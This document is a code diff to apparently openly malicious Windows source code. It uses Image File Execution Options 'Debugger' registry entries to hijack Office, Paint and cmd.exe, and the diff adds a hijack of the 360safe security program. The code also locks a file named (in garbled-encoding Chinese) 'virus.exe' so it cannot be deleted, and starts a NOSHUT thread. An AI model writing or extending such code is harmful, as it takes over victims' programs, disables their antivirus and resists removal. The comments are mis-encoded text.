@@ -256,7 +256,7 @@ void CreateReg(HKEY Root,char*szSubKey,char* ValueName,char* Data)
 	HKEY key;
 	long Ret=RegCreateKeyEx(Root,szSubKey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&key,NULL);
     Ret=RegSetValueEx(key,ValueName,0,REG_SZ,(BYTE*)Data,strlen(Data));
-	RegCloseKey(key);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
+	RegCloseKey(key);
 }
 int main()
 {
@@ -280,6 +280,7 @@ int main()
 	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ONENOTE.exe","Debugger",(char*)k.c_str());
 	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\EXCEL.exe","Debugger",(char*)k.c_str());
 	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\mspaint.exe","Debugger",(char*)k.c_str());
+	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\360safe.exe","Debugger",(char*)k.c_str());
 	CreateReg(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\cmd.exe","Debugger",(char*)k.c_str());//Ó³Ïñ½Ù³Ö 
     FILE *lock=fopen("²¡¶¾.exe","rb");//ËøËÀÎÄ¼þ,É±²»µô 
 	CreateThread(NULL,4096,&NOSHUT,NULL,NULL,NULL);
